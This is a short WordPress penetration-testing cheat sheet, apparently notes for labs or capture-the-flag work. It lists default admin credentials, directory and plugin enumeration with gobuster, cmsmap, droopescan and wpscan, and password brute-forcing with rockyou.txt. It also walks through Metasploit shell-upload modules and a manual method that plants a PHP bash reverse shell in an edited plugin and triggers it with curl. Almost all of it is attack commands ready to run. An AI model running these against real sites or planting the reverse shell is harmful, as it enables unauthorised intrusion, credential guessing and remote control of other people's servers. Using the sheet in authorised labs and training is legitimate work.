# Wordpress

## Default Credentials

|Field|Value|
|:--|:--|
|username|admin|
|password|password|

## Enumeration

### gobuster

> Enumeration site

    gobuster dir -w /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt -k -u http://IP_ADDRESS
    gobuster dir -w /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt -k -u http://IP_ADDRESS
    gobuster dir -w /usr/share/seclists/Discovery/Web-Content/CMS/wp-themes.fuzz.txt -k -u http://IP_ADDRESS

### cmsmap

    cmsmap -f W http://IP_ADDRESS/

### droopescan

    droopescan scan wordpress -u http://IP_ADDRESS/moodle/

### wpscan

wpscan --url IP_ADDRESS

> Enumeration username

    wpscan –url http://IP_ADDRESS/ -e u

> Enumeration themes

    wpscan –url http://IP_ADDRESS/ -e at

> Enumeration plugins

    wpscan –url http://IP_ADDRESS/ -e ap

> Password brutforce

Wpscan will try to enumerate user.

    wpscan --url http://IP_ADDRESS -P rockyou.txt


    wpscan --url http://IP_ADDRESS -U user.txt -P rockyou.txt


    Shell Upload using Metasploit

## Upload shell

### wp admin shell

    msf > use exploit/unix/webapp/wp_admin_shell_upload
    msf exploit(wp_admin_shell_upload) > set RHOSTS IP_ADDRESS
    msf exploit(wp_admin_shell_upload) > set USERNAME username
    msf exploit(wp_admin_shell_upload) > set PASSWORD password
    msf exploit(wp_admin_shell_upload) > set TARGETURI /
    msf exploit(wp_admin_shell_upload) > run

### Exploit plugin - slideshowgallery

    use exploit/unix/webapp/wp_slideshowgallery_upload
    msf exploit(wp_slideshowgallery_upload) > set RHOSTS IP_ADDRESS
    msf exploit(wp_slideshowgallery_upload) > set USERNAME username
    msf exploit(wp_slideshowgallery_upload) > set PASSWORD password
    msf exploit(wp_slideshowgallery_upload) > set TARGETURI /
    msf exploit(wp_slideshowgallery_upload) > run

### Manule

Go to: `http://IP_ADDRESS/wp-admin/plugins.php`

Edit a plugin

Add :

```sh
<?php
exec("/bin/bash -c \"/bin/bash -i >& /dev/tcp/IP_ADDRESS/PORT 0>&1\" &");
?>
```

Run plugin:

```sh
curl -v http://IP_ADDRESS/wp-content/plugins/Plugin_Name/File_Name.php 
```
